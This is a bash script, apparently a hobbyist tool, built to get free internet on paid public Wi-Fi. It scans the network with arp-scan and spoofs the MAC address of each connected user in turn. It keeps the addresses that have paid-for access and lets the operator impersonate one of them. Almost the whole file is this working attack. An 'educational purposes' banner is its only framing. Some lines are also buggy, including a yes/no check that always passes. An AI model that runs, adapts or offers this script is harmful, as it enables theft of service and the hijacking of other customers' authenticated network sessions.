#!/usr/bin/bash
# Just a Mac Spoofer with Intentions of Getting Free internet
#   ............Can be used in open Wifi with Menu paying option...
#   ............Made by Yada formerly Malibu
Danger='\033[1;31m'
Red='\033[0;35m'
Yellow='\033[1;33m' 
reset="\e[0m"
frep="/tmp/freep"
online="online.txt"
allusers="allusers.txt"
users="users"

clear

#file management
if [[ -d $frep ]];then
	echo -e "[✔] ${Yellow} located alien spacecship....${reset}"
	sleep 1
	if [[ -f "$frep/allusers.txt" ]];then
		sleep 1
		echo -e "[✔] ${Yellow} Found and killed alien life.. ${reset}"
		rm -rf $frep/allusers.txt
	else
		echo -e "[◉]${Yellow} Alien life not found"
	fi
	if  [[ -f "$frep/online.txt" ]]; then
		sleep 1
		echo -e "[✔] ${Yellow} Found cute alien , storing her... ${reset}"
		#mv $frep/online.txt $frep/freepcollections
		echo "$frep/online.txt" >> $frep/freepcollections/online.txt
		rm -rf $frep/online.txt
		sleep 3
		clear
	else
		echo -e "[◉] ${Yellow} Alien life unavailable ${reset}"
		clear
	fi
	if [[ -f "$frep/users" ]]; then
		rm -rf $frep/users
	else
		echo -e "[◉] ${Yellow} Alien life not found..."
		sleep 3
		clear
	fi
else
	mkdir {"/tmp/freep","/tmp/freep/freepcollections"}
	echo -e "${Yellow} Welcome created...first alien ${reset}"
	sleep 1
	clear
fi

# scanning for users with internet function
get_interface(){
	interface=$(iw dev | awk '$1=="Interface"{print $2}')
}
# start and stop wifi functions
kill_wifi(){
	nmcli radio wifi off
}
wake_wifi(){
	nmcli radio wifi on
}
#running part 2 of the script
select_point(){
	if [[ -f /tmp/freep/freepcollections/online.txt ]]; then
		output=$(cat /tmp/freep/freepcollections/online.txt | fzf)
		get_interface
		nmcli radio wifi off
		sudo macchanger --mac=${output} $interface $>/dev/null
		nmcli radio wifi on
		echo -e "[✔] ${Yellow} Happy Hacking ${reset}"
	else
		echo -e "[◉] ${Yellow} Alien life was not found, Run live scan ${reset}"
	fi
}
#running part 1 of the script
scan_for_internet(){
	echo -e "${Yellow} Enter the public paid wifi name....${reset}"
	read wifiname_1
	nmcli d wifi connect "${wifiname_1}" &> /dev/null
	sleep 5
	sudo arp-scan -l | awk '/.*:.*:.*:.*:.*:.*/{print $2}' >> /tmp/freep/allusers.txt
	tail -n +4 /tmp/freep/allusers.txt >> /tmp/freep/users
	tots=$(wc -l /tmp/freep/users | awk '{print $1}')
	echo -e "${Yellow} $tots users connected to network ${reset}"
	input="/tmp/freep/users"
	while IFS= read -r user
	do
		kill_wifi
		get_interface
		sudo macchanger --mac=${user} $interface $>/dev/null
		#sudo macchanger --show $interface show current and temporary mac  debugging mac
		wake_wifi
		sleep 2
		nmcli d wifi connect "${wifiname_1}" &>/dev/null
		sleep 5 
		Routing_to=$(ip route show default | awk '/default/ {print $3}')
		echo -e "${Yellow} [~]${reset} Checking interent connectivity on ${Yellow} $user ${reset} ... Route:_ ${Yellow} $Routing_to ${reset}"
		wget -q --tries=2 --timeout=2 --spider google.com
		if [[ "$?" -eq "0" ]]; then
			echo -e "[✔] ${Yellow} Internet available ${reset}"
			echo "$user" >> /tmp/freep/online.txt
		else
			echo -e "[◉] ${Danger} No internet conections ${reset}"
		fi
	done < "$input"
	echo -e "${Yellow} Would you like 2 set a live user from scanned [y/n] ${reset}"
	read part2
	if [[ "$part2" == "y" || "yes" || "Y" || "Yes" || "YES" ]]; then
		if [[ -f /tmp/freep/online.txt ]]; then
			output=$(cat /tmp/freep/online.txt | fzf)
			get_interface
			kill_wifi
			sudo macchanger --mac=${output} $interface $>/dev/null
			wake_wifi
			echo -e "[✔] ${Yellow} Happy hacking if successfull ${reset}"
		else
			echo -e "[◉] ${Yellow} You lets check storage"
			sleep 2
			select_point

		fi
	fi


}


banner(){ 
echo -e ${Red}    "  │ ▄████  █▄▄▄▄ ▄███▄   ▄███▄   █ ▄▄   ▄ ▄   ██   ▄█ ▄████ ▄     "
echo -e ${Red}    "  │ █▀   ▀ █  ▄▀ █▀   ▀  █▀   ▀  █   █ █   █  █ █  ██ █▀   ▀ █    "
echo -e ${Danger} "  │ █▀▀    █▀▀▌  ██▄▄    ██▄▄    █▀▀▀ █ ▄   █ █▄▄█ ██ █▀▀ █   █   "
echo -e ${Danger} "  │ █      █  █  █▄   ▄▀ █▄   ▄▀ █    █  █  █ █  █ ▐█ █   █   █   "
echo -e ${Red}    "  │  █       █   ▀███▀   ▀███▀    █    █ █ █     █  ▐  █  █▄ ▄█   "
echo -e ${Yellow} "  │   ▀     ▀                      ▀    ▀ ▀     █       ▀  ▀▀▀    "
echo -e ${Yellow} "  │   ©Yada 2022 --Made with Love For Educational Purposes        "${reset}
}

banner
cat << EOF
Choose your Poison:
    1. Scan for live internet user
    2. Select live user from file
    3. Remove all alien life
    0. Quit
EOF
echo -n 'Enter selection [0-quit]: '
read -r poison

case $poison in
	0) echo "Program terminated.";;
	1) scan_for_internet ;;
	2) select_point ;;
	3)
		rm -rf /tmp/freep
	;;
	*)
		echo "Invalid entry." >&2
		exit 1
esac
